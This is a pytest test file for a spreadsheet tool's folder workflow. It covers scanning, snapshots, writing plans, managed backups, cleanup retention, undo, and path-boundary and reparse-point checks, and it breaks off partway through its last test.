from __future__ import annotations

import asyncio
import json
import shutil
import subprocess
import sys
from datetime import date, datetime, timedelta
from pathlib import Path

from openpyxl import Workbook, load_workbook
import pytest

import server.app.folder_workbooks as folder_workbooks_module

from server.app.folder_workbooks import (
    FolderExecuteRequest,
    FolderSelection,
    FolderSnapshotRequest,
    OUTPUT_FILE_NAME,
    create_folder_snapshot,
    cleanup_folder_backups,
    cleanup_folder_task_artifacts,
    delete_folder_backup,
    execute_folder_plan,
    export_folder_backup,
    folder_execution_context,
    folder_resume_checkpoint_summary,
    list_folder_backups,
    open_folder_backup_directory,
    refresh_folder,
    resume_folder_plan,
    scan_folder,
    scan_folder_by_path,
    set_folder_backup_pinned,
    undo_folder_execution,
)
from server.app.models import AnalysisPlan, FolderUndoRequest, PlanRequest
from server.app.planner import create_plan
from server.app.task_ledger import FolderOperationLedger


def _stamp_plan(plan: AnalysisPlan, snapshot) -> AnalysisPlan:
    return plan.model_copy(
        update={
            "sourceFingerprint": snapshot.sourceFingerprint,
            "sourceFingerprintSheets": snapshot.sourceFingerprintSheets,
        }
    )


def _create_source(path: Path) -> None:
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "得分"
    sheet.append(["人员", "得分"])
    sheet.append(["嘟嘟嘟", 33])
    sheet.append(["阿里", 44])
    workbook.create_sheet("说明")
    workbook.save(path)
    workbook.close()


def _execute_score_write_backup(tmp_path: Path, value: int = 35):
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "delete-backup-test",
            "title": "删除备份测试",
            "summary": "修改已有文件并产生可撤销备份",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[value]],
                }
            ],
        }
    )
    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId,
            plan=_stamp_plan(plan, snapshot),
        )
    )
    assert result.undo is not None
    return source, catalog, result


def test_folder_scan_and_selected_snapshot(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)

    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )

    assert len(catalog.files) == 1
    assert snapshot.name == f"文件夹：{tmp_path.name}"
    assert snapshot.worksheets[0].sourceFile == "scores.xlsx"
    assert snapshot.worksheets[0].sourceSheet == "得分"
    assert snapshot.worksheets[0].dataRows[0] == ["嘟嘟嘟", 33]


def test_folder_scan_excludes_the_managed_backup_tree(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    exported = tmp_path / ".excel-bro-backups" / "exports" / "copy.xlsx"
    exported.parent.mkdir(parents=True)
    _create_source(exported)

    catalog = scan_folder(tmp_path)

    assert [file.relativePath for file in catalog.files] == ["scores.xlsx"]


def test_folder_catalog_reports_scan_truncation(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    for index in range(3):
        _create_source(tmp_path / f"{index}.xlsx")
    monkeypatch.setattr("server.app.folder_workbooks.FILE_LIMIT", 2)

    catalog = scan_folder(tmp_path)

    assert len(catalog.files) == 2
    assert catalog.totalFiles == 3
    assert catalog.truncated is True
    assert catalog.expiresAt


def test_refresh_folder_keeps_session_and_updates_file_list(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)

    renamed = tmp_path / "renamed.xlsx"
    source.rename(renamed)
    (tmp_path / "added.xlsx").write_bytes(b"not an excel file")

    refreshed = refresh_folder(catalog.sessionId)

    assert refreshed.sessionId == catalog.sessionId
    assert refreshed.folderName == catalog.folderName
    names = {file.name for file in refreshed.files}
    assert "renamed.xlsx" in names
    assert "scores.xlsx" not in names
    # 无法读取的文件保留错误信息而不是丢失条目
    added = next(file for file in refreshed.files if file.name == "added.xlsx")
    assert added.error is not None


def test_refresh_folder_reflects_new_worksheets_in_existing_file(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)

    workbook = load_workbook(source)
    workbook.create_sheet("新增")
    workbook.save(source)
    workbook.close()

    refreshed = refresh_folder(catalog.sessionId)

    assert refreshed.files[0].relativePath == "scores.xlsx"
    assert {sheet.name for sheet in refreshed.files[0].worksheets} == {
        "得分",
        "说明",
        "新增",
    }


def test_refresh_folder_rejects_unknown_session() -> None:
    with pytest.raises(ValueError, match="会话已失效"):
        refresh_folder("missing-session")


def test_folder_snapshot_normalizes_dates_codes_and_display_values(
    tmp_path: Path,
) -> None:
    source = tmp_path / "typed.xlsx"
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "数据"
    sheet.append(["日期", "编码", "完成率"])
    sheet.append([date(2026, 7, 29), 1, 0.25])
    sheet["B2"].number_format = "000"
    sheet["C2"].number_format = "0%"
    workbook.save(source)
    workbook.close()

    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["数据"])
            ],
        )
    )

    values = snapshot.worksheets[0]
    assert values.dataRows == [["2026-07-29", "001", 0.25]]
    assert values.displayRows == [["2026-07-29", "001", "25%"]]


def test_folder_plan_writes_output_workbook(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    plan = AnalysisPlan.model_validate(
        {
            "id": "folder-output",
            "title": "生成汇总",
            "summary": "写入独立结果文件",
            "actions": [
                {"type": "createWorksheet", "sheet": "汇总"},
                {
                    "type": "writeTable",
                    "sheet": "汇总",
                    "startCell": "A1",
                    "headers": ["人员", "得分"],
                    "rows": [["嘟嘟嘟", 33]],
                },
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan)
    )

    output = load_workbook(tmp_path / "Excel Bro 结果.xlsx", data_only=True)
    assert result.filesModified == ["Excel Bro 结果.xlsx"]
    assert result.backups == []
    assert result.undo is not None
    assert len(result.actionResults) == 2
    assert result.verification.status == "verified"
    assert result.verification.passed is True
    assert all(check.passed for check in result.verification.checks)
    assert output["汇总"]["B2"].value == 33
    output.close()
    recovery_point = list_folder_backups(catalog.sessionId).backups[0]
    assert recovery_point.totalBytes == 0
    assert recovery_point.files[0].recoveryAction == "remove"


def test_every_started_folder_step_gets_its_own_terminal_event(
    tmp_path: Path,
) -> None:
    """真实执行一次文件夹写入：每个 started 的步骤都必须有自己的终态。

    以前 ``folder.prepare-files``（以及拆分表的 ``.sheets`` 子步骤）只有
    started/progress，永远停在进行中 —— 前端只能靠"后面出现了下一步"倒推它做完，
    那是对用户的猜测。这里直接看真实执行发出的事件序列。
    """
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    plan = AnalysisPlan.model_validate(
        {
            "id": "folder-step-terminals",
            "title": "写入得分",
            "summary": "修改已有文件的单元格",
            "actions": [
                {"type": "writeValues", "sheet": "得分", "range": "B2", "values": [[35]]}
            ],
        }
    )
    events: list[dict] = []

    execute_folder_plan(
        FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan),
        on_progress=events.append,
    )

    terminal = {"completed", "warning", "failed", "cancelled"}
    started_indexes = {
        event["stepId"]: index
        for index, event in enumerate(events)
        if event.get("status") == "started"
    }
    assert started_indexes, "这次执行没有发出任何 started 事件，判据无从成立"

    dangling = []
    for step_id, start_index in started_indexes.items():
        closed = any(
            later.get("stepId") == step_id and later.get("status") in terminal
            for later in events[start_index + 1 :]
        )
        if not closed:
            dangling.append(step_id)
    assert dangling == [], f"这些步骤开始了但没有终态：{dangling}"

    # 具体判别点：准备待写入文件这一步有真实的完成事件。
    assert any(
        event.get("stepId") == "folder.prepare-files"
        and event.get("status") == "completed"
        for event in events
    )


def test_existing_file_is_backed_up_before_write(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "folder-edit",
            "title": "修正得分",
            "summary": "修改已有文件",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": "scores.xlsx › 得分",
                    "range": "B2",
                    "values": [[35]],
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    updated = load_workbook(source, data_only=True)
    assert updated["得分"]["B2"].value == 35
    updated.close()
    assert result.filesModified == ["scores.xlsx"]
    assert len(result.backups) == 1
    backup_path = tmp_path / result.backups[0]
    assert backup_path.exists()
    assert backup_path.parts[-4] == ".excel-bro-backups"
    assert result.undo is not None
    assert backup_path.parent.name == result.undo.undoId
    assert result.backupDirectory == str(tmp_path / ".excel-bro-backups")

    manifest = json.loads((backup_path.parent / "manifest.json").read_text("utf-8"))
    assert manifest["status"] == "ready"
    assert manifest["undoId"] == result.undo.undoId
    assert manifest["planTitle"] == "修正得分"
    assert manifest["files"][0]["originalRelativePath"] == "scores.xlsx"

    listed = list_folder_backups(catalog.sessionId)
    assert [entry.undoId for entry in listed.backups] == [result.undo.undoId]
    assert listed.backups[0].canUndo is True
    assert listed.backups[0].undoSessionId == catalog.sessionId
    assert listed.backups[0].files[0].recoveryAction == "restore"
    assert listed.storageSummary is not None
    assert listed.storageSummary.automaticBytes == listed.backups[0].totalBytes
    assert listed.storageSummary.pinnedBytes == 0
    assert listed.storageSummary.abnormalBytes == 0
    assert listed.storageSummary.complete is True

    reopened = scan_folder(tmp_path)
    reopened_list = list_folder_backups(reopened.sessionId)
    assert reopened_list.backups[0].canUndo is True
    assert reopened_list.backups[0].undoSessionId == catalog.sessionId

    exported = export_folder_backup(
        catalog.sessionId, result.undo.undoId, operation_id="export-retry-test"
    )
    assert exported.files
    assert (Path(exported.exportDirectory) / "scores.xlsx").exists()
    replayed_export = export_folder_backup(
        catalog.sessionId, result.undo.undoId, operation_id="export-retry-test"
    )
    assert replayed_export.exportDirectory == exported.exportDirectory
    assert replayed_export.files == exported.files
    assert len(list((tmp_path / ".excel-bro-backups" / "exports").iterdir())) == 1

    cleanup = cleanup_folder_backups(catalog.sessionId)
    assert cleanup.deletedExecutions == 0
    assert cleanup.skippedActive == 1
    assert cleanup.protectedExecutions == 1
    assert cleanup.retainedBytes >= listed.backups[0].totalBytes
    assert backup_path.exists()

    # 工作簿模式下只有文件夹路径没有会话：备份仍要能列出来，但不带撤销能力，
    # 因为撤销要写回文件，必须走已建立的会话。
    by_path = list_folder_backups(folder_path=str(tmp_path))
    assert [entry.undoId for entry in by_path.backups] == [result.undo.undoId]
    assert by_path.folderPath == str(tmp_path)
    assert by_path.backupDirectory == str(tmp_path / ".excel-bro-backups")
    assert by_path.storageSummary is not None
    assert by_path.storageSummary.exportedBytes > 0


def test_same_value_write_does_not_save_or_create_recovery_point(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    original_bytes = source.read_bytes()
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "same-value-write",
            "title": "写入相同值",
            "summary": "相同内容不应产生文件写入和恢复点",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[33]],
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId,
            plan=_stamp_plan(plan, snapshot),
        )
    )

    assert result.filesModified == []
    assert result.backups == []
    assert result.backupDirectory is None
    assert result.undo is None
    assert result.actionResults[0].changed is False
    assert source.read_bytes() == original_bytes
    assert not (tmp_path / ".excel-bro-backups").exists()


def test_folder_write_stops_before_touching_original_when_space_is_insufficient(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    original_bytes = source.read_bytes()
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "insufficient-space",
            "title": "空间不足保护",
            "summary": "空间不足时不得无备份写入",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[99]],
                }
            ],
        }
    )
    disk_usage_type = type(folder_workbooks_module.shutil.disk_usage(tmp_path))
    monkeypatch.setattr(
        folder_workbooks_module.shutil,
        "disk_usage",
        lambda _path: disk_usage_type(total=1024, used=1024, free=0),
    )

    with pytest.raises(ValueError, match="剩余空间不足"):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    assert source.read_bytes() == original_bytes
    assert not (tmp_path / ".excel-bro-backups").exists()
    assert not list(tmp_path.glob(".*.excel-bro-tmp-*.xlsx"))


def test_list_folder_backups_requires_a_session_or_folder_path(
    tmp_path: Path,
) -> None:
    with pytest.raises(ValueError, match="必须提供 sessionId 或 folderPath"):
        list_folder_backups()

    with pytest.raises(ValueError, match="文件夹路径无效"):
        list_folder_backups(folder_path=str(tmp_path / "不存在的目录"))


def test_list_folder_backups_by_path_returns_empty_for_untouched_folder(
    tmp_path: Path,
) -> None:
    # 从未执行过写入的文件夹没有 .excel-bro-backups，应返回空列表而不是报错，
    # 这样顶部栏的备份入口在任何本地文件夹下都能安全打开。
    _create_source(tmp_path / "scores.xlsx")

    listed = list_folder_backups(folder_path=str(tmp_path))

    assert listed.backups == []
    assert listed.legacyCandidates == []
    assert listed.backupDirectory == str(tmp_path / ".excel-bro-backups")
    assert listed.openDirectoryToken is None
    assert not (tmp_path / ".excel-bro-backups").exists()


def test_open_folder_backup_directory_uses_only_registered_directory(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _create_source(tmp_path / "scores.xlsx")
    (tmp_path / ".excel-bro-backups").mkdir()
    listed = list_folder_backups(folder_path=str(tmp_path))
    opened: list[str] = []
    focused: list[tuple[Path, set[int]]] = []
    monkeypatch.setattr(
        folder_workbooks_module.os,
        "startfile",
        lambda path: opened.append(path),
        raising=False,
    )
    monkeypatch.setattr(
        folder_workbooks_module,
        "_explorer_window_handles",
        lambda: [(101, "已打开窗口")],
    )
    monkeypatch.setattr(
        folder_workbooks_module,
        "_focus_opened_explorer_window",
        lambda directory, handles: focused.append((directory, handles)) or True,
    )

    result = open_folder_backup_directory(listed.openDirectoryToken)

    expected = tmp_path / ".excel-bro-backups"
    assert result.opened is True
    assert result.directory == str(expected)
    assert opened == [str(expected)]
    assert focused == [(expected, {101})]
    assert expected.is_dir()


def test_open_folder_backup_directory_still_opens_when_window_lookup_fails(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    backup_root = tmp_path / ".excel-bro-backups"
    backup_root.mkdir()
    listed = list_folder_backups(folder_path=str(tmp_path))
    opened: list[str] = []
    monkeypatch.setattr(
        folder_workbooks_module.os,
        "startfile",
        lambda path: opened.append(path),
        raising=False,
    )
    monkeypatch.setattr(
        folder_workbooks_module,
        "_explorer_window_handles",
        lambda: (_ for _ in ()).throw(OSError("无法枚举窗口")),
    )
    monkeypatch.setattr(
        folder_workbooks_module,
        "_focus_opened_explorer_window",
        lambda directory, handles: True,
    )

    result = open_folder_backup_directory(listed.openDirectoryToken)

    assert result.opened is True
    assert opened == [str(backup_root)]


def test_open_folder_backup_directory_rejects_unknown_or_tampered_token(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    with pytest.raises(ValueError, match="凭证已失效"):
        open_folder_backup_directory("missing-token")

    (tmp_path / ".excel-bro-backups").mkdir()
    listed = list_folder_backups(folder_path=str(tmp_path))
    registration = folder_workbooks_module._registered_backup_directories[
        listed.openDirectoryToken
    ]
    folder_workbooks_module._registered_backup_directories[
        listed.openDirectoryToken
    ] = folder_workbooks_module._RegisteredBackupDirectory(
        root=registration.root,
        directory=tmp_path / "其他目录",
        expires_at=registration.expires_at,
    )
    monkeypatch.setattr(
        folder_workbooks_module.os,
        "startfile",
        lambda path: pytest.fail(f"不应打开未登记目标：{path}"),
        raising=False,
    )

    with pytest.raises(ValueError, match="路径边界检查"):
        open_folder_backup_directory(listed.openDirectoryToken)


def test_open_folder_backup_directory_rejects_expired_token(tmp_path: Path) -> None:
    (tmp_path / ".excel-bro-backups").mkdir()
    listed = list_folder_backups(folder_path=str(tmp_path))
    registration = folder_workbooks_module._registered_backup_directories[
        listed.openDirectoryToken
    ]
    folder_workbooks_module._registered_backup_directories[
        listed.openDirectoryToken
    ] = folder_workbooks_module._RegisteredBackupDirectory(
        root=registration.root,
        directory=registration.directory,
        expires_at=0,
    )

    with pytest.raises(ValueError, match="凭证已失效"):
        open_folder_backup_directory(listed.openDirectoryToken)


def test_open_folder_backup_directory_rejects_reparse_point(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    backup_root = tmp_path / ".excel-bro-backups"
    backup_root.mkdir()
    listed = list_folder_backups(folder_path=str(tmp_path))
    monkeypatch.setattr(
        folder_workbooks_module,
        "_has_reparse_point",
        lambda path, boundary: path == backup_root,
    )
    monkeypatch.setattr(
        folder_workbooks_module.os,
        "startfile",
        lambda path: pytest.fail(f"不应打开 reparse point：{path}"),
        raising=False,
    )

    with pytest.raises(ValueError, match="reparse point"):
        open_folder_backup_directory(listed.openDirectoryToken)


def test_managed_backup_preserves_relative_paths_for_same_named_files(
    tmp_path: Path,
) -> None:
    for region in ("华南", "华北"):
        directory = tmp_path / region
        directory.mkdir()
        _create_source(directory / "报表.xlsx")
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=file.id, sheets=["得分"])
                for file in catalog.files
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "same-name-backups",
            "title": "修改同名报表",
            "summary": "两个区域的同名文件都需要安全备份",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": sheet.name,
                    "range": "B2",
                    "values": [[index + 50]],
                }
                for index, sheet in enumerate(snapshot.worksheets)
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    assert result.undo is not None
    execution_directory = (
        tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    )
    assert (execution_directory / "华南" / "报表.xlsx").exists()
    assert (execution_directory / "华北" / "报表.xlsx").exists()
    assert len(result.backups) == 2

    (execution_directory / "华南" / "报表.xlsx").unlink()
    partial_export = export_folder_backup(
        catalog.sessionId,
        result.undo.undoId,
        operation_id="export-partial-backup",
    )
    assert partial_export.complete is False
    assert len(partial_export.files) == 1
    assert len(partial_export.failures) == 1
    assert "备份文件不存在" in partial_export.failures[0]


def test_cleanup_keeps_each_files_latest_valid_backup(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "expired-backup",
            "title": "生成过期测试备份",
            "summary": "测试孤立备份保留期限",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[36]],
                }
            ],
        }
    )
    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )
    assert result.undo is not None
    directory = tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    manifest_path = directory / "manifest.json"
    manifest = json.loads(manifest_path.read_text("utf-8"))
    manifest["createdAt"] = (
        datetime.now().astimezone() - timedelta(days=8)
    ).isoformat()
    manifest["completedAt"] = manifest["createdAt"]
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
    folder_workbooks_module._sessions[catalog.sessionId].undo_stack.clear()

    cleaned = cleanup_folder_backups(catalog.sessionId)

    assert cleaned.deletedExecutions == 0
    assert cleaned.skippedActive == 1
    assert directory.exists()


def test_cleanup_keeps_latest_restored_backup_for_each_file(tmp_path: Path) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    assert result.undo is not None
    directory = tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    manifest_path = directory / "manifest.json"
    manifest = json.loads(manifest_path.read_text("utf-8"))
    old_time = (datetime.now().astimezone() - timedelta(days=8)).isoformat()
    manifest["status"] = "restored"
    manifest["createdAt"] = old_time
    manifest["completedAt"] = old_time
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
    folder_workbooks_module._sessions[catalog.sessionId].undo_stack.clear()

    cleaned = cleanup_folder_backups(catalog.sessionId)

    assert cleaned.deletedExecutions == 0
    assert cleaned.skippedActive == 1
    assert directory.exists()


def test_cleanup_removes_only_older_expired_backup_for_same_file(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    directories: list[Path] = []
    for index, value in enumerate((35, 36)):
        snapshot = create_folder_snapshot(
            FolderSnapshotRequest(
                sessionId=catalog.sessionId,
                selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
            )
        )
        plan = AnalysisPlan.model_validate(
            {
                "id": f"expired-chain-{index}",
                "title": f"第 {index + 1} 次修改",
                "summary": "验证每个原文件至少保留最新恢复点",
                "actions": [
                    {
                        "type": "writeValues",
                        "sheet": snapshot.worksheets[0].name,
                        "range": "B2",
                        "values": [[value]],
                    }
                ],
            }
        )
        result = execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId,
                plan=_stamp_plan(plan, snapshot),
            )
        )
        assert result.undo is not None
        directory = (
            tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
        )
        manifest_path = directory / "manifest.json"
        manifest = json.loads(manifest_path.read_text("utf-8"))
        old_time = (
            datetime.now().astimezone() - timedelta(days=9 - index)
        ).isoformat()
        manifest["createdAt"] = old_time
        manifest["completedAt"] = old_time
        manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
        directories.append(directory)
    folder_workbooks_module._sessions[catalog.sessionId].undo_stack.clear()

    cleaned = cleanup_folder_backups(catalog.sessionId)

    assert cleaned.deletedExecutions == 1
    assert not directories[0].exists()
    assert directories[1].exists()


def test_cleanup_keeps_damaged_latest_and_earlier_last_healthy_backup(
    tmp_path: Path,
) -> None:
    _source, first_catalog, first = _execute_score_write_backup(tmp_path, 35)
    _source, second_catalog, second = _execute_score_write_backup(tmp_path, 36)
    assert first.undo is not None
    assert second.undo is not None
    execution_root = tmp_path / ".excel-bro-backups" / "executions"
    directories = [execution_root / first.undo.undoId, execution_root / second.undo.undoId]
    for index, directory in enumerate(directories):
        manifest_path = directory / "manifest.json"
        manifest = json.loads(manifest_path.read_text("utf-8"))
        old_time = (
            datetime.now().astimezone() - timedelta(days=9 - index)
        ).isoformat()
        manifest["createdAt"] = old_time
        manifest["completedAt"] = old_time
        manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
    latest_manifest = json.loads((directories[1] / "manifest.json").read_text("utf-8"))
    latest_backup = directories[1] / latest_manifest["files"][0]["backupRelativePath"]
    latest_backup.unlink()
    for session in folder_workbooks_module._sessions.values():
        if session.root == tmp_path:
            session.undo_stack.clear()

    cleaned = cleanup_folder_backups(second_catalog.sessionId)
    listed = {
        entry.undoId: entry
        for entry in list_folder_backups(first_catalog.sessionId).backups
    }

    assert cleaned.deletedExecutions == 0
    assert cleaned.protectedExecutions == 2
    assert all(directory.exists() for directory in directories)
    assert listed[second.undo.undoId].status == "needs_attention"
    assert listed[second.undo.undoId].canUndo is False


def test_v1_ready_backup_is_view_only_even_when_memory_record_exists(
    tmp_path: Path,
) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    assert result.undo is not None
    directory = tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    manifest_path = directory / "manifest.json"
    manifest = json.loads(manifest_path.read_text("utf-8"))
    manifest["version"] = 1
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")

    listed = list_folder_backups(catalog.sessionId).backups[0]
    assert listed.undoAvailability == "view_only"
    assert listed.canUndo is False
    with pytest.raises(ValueError, match="旧版恢复点"):
        undo_folder_execution(
            FolderUndoRequest(
                sessionId=result.undo.sessionId, undoId=result.undo.undoId
            )
        )


def test_cleanup_atomically_stages_candidate_when_recursive_delete_is_blocked(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    directories: list[Path] = []
    for index, value in enumerate((35, 36)):
        snapshot = create_folder_snapshot(
            FolderSnapshotRequest(
                sessionId=catalog.sessionId,
                selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
            )
        )
        plan = AnalysisPlan.model_validate(
            {
                "id": f"cleanup-stage-{index}",
                "title": f"清理暂存 {index + 1}",
                "summary": "验证自动清理先原子移出恢复列表",
                "actions": [
                    {
                        "type": "writeValues",
                        "sheet": snapshot.worksheets[0].name,
                        "range": "B2",
                        "values": [[value]],
                    }
                ],
            }
        )
        result = execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )
        assert result.undo is not None
        directory = tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
        manifest_path = directory / "manifest.json"
        manifest = json.loads(manifest_path.read_text("utf-8"))
        old_time = (
            datetime.now().astimezone() - timedelta(days=9 - index)
        ).isoformat()
        manifest["createdAt"] = old_time
        manifest["completedAt"] = old_time
        manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
        directories.append(directory)
    folder_workbooks_module._sessions[catalog.sessionId].undo_stack.clear()
    original_rmtree = folder_workbooks_module.shutil.rmtree

    def fail_staged_delete(candidate: Path, *args, **kwargs):
        candidate_path = Path(candidate)
        if candidate_path.name == directories[0].name and ".trash" in candidate_path.parts:
            raise PermissionError("文件正在使用")
        return original_rmtree(candidate, *args, **kwargs)

    monkeypatch.setattr(folder_workbooks_module.shutil, "rmtree", fail_staged_delete)

    cleaned = cleanup_folder_backups(catalog.sessionId)

    assert cleaned.deletedExecutions == 1
    assert cleaned.bytesFreed == 0
    assert any("内部删除暂存仍待清理" in failure for failure in cleaned.failures)
    assert not directories[0].exists()
    assert directories[1].exists()
    staged = list(
        (tmp_path / ".excel-bro-backups" / ".trash").rglob(directories[0].name)
    )
    assert len(staged) == 1
    assert list_folder_backups(catalog.sessionId).storageSummary.pendingCleanupBytes > 0

    monkeypatch.setattr(folder_workbooks_module.shutil, "rmtree", original_rmtree)
    retried = cleanup_folder_backups(catalog.sessionId)
    assert retried.bytesFreed > 0
    assert not (tmp_path / ".excel-bro-backups" / ".trash").exists()
    assert list_folder_backups(catalog.sessionId).storageSummary.pendingCleanupBytes == 0


def test_cleanup_never_deletes_abandoned_v1_creating_backup(tmp_path: Path) -> None:
    _source, catalog, result = _execute_score_write_backup(tmp_path)
    directory = tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
    manifest_path = directory / "manifest.json"
    manifest = json.loads(manifest_path.read_text("utf-8"))
    manifest["version"] = 1
    manifest["status"] = "creating"
    manifest["createdAt"] = (
        datetime.now().astimezone() - timedelta(days=8)
    ).isoformat()
    manifest.pop("completedAt", None)
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False), encoding="utf-8")
    folder_workbooks_module._sessions[catalog.sessionId].undo_stack.clear()

    cleaned = cleanup_folder_backups(catalog.sessionId)
    listed = list_folder_backups(catalog.sessionId)

    assert cleaned.deletedExecutions == 0
    assert directory.exists()
    assert listed.backups[0].status == "needs_attention"
    assert listed.backups[0].canUndo is False


def test_cleanup_keeps_candidate_when_reparse_check_fails(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "unsafe-backup",
            "title": "生成安全边界测试备份",
            "summary": "reparse point 必须阻止清理",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": snapshot.worksheets[0].name,
                    "range": "B2",
                    "values": [[37]],
                }
            ],
        }
    )
    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )
    assert result.undo is not None
    directory = tmp_path / ".excel-bro-backups" / "executions" / result.undo.undoId
